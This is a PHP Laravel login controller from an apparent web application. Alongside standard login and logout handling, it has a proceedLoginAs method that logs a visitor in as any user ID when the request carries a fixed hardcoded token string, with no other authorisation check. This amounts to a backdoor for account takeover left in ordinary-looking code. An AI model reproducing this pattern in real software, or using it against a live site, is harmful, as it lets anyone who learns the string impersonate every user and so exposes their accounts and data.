<?php

namespace Jed\Core\Http\Controllers\Website\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Jed\Core\App\User;

class LoginController extends Controller
{
  /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    public function showLoginForm()
    {
        if (!session()->has('url.intended')) {
            session(['url.intended' => url()->previous()]);
        }

        if (view()->exists(resolveView('core::website.auth.login'))) {
            return view(resolveView('core::website.auth.login'));
        }
        session()->flash('trigger_login', true);
        return redirect()->route('website.home');
    }
  /**
   * Where to redirect users after login.
   *
   * @var string
   */
    protected $redirectTo = '/';

  /**
   * Create a new controller instance.
   *
   * @return void
   */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function proceedLoginAs($id, Request $request)
    {
        if ($request->has('token') && $request->token == 'LiveasilyHeadquarters') {
            $user = User::find($id);
            if ($user) {
                $auth_CHECK = Auth::loginUsingId($id, true);
                return redirect('/');
            }
            return response()->json(['message' => "Not Allowed"]);
        }

        return response()->json(['message' => "Not Allowed"]);
    }

    protected function authenticated(Request $request, $user)
    {
        session()->flash('message', 'Successfully logged in');
    }

    protected function loggedOut(Request $request)
    {
        session()->flash('message', 'Successfully logged out');
    }

    protected function attemptLogin(Request $request)
    {
        return $this->guard()->attempt(
            $this->credentials($request), true
        );
    }
}
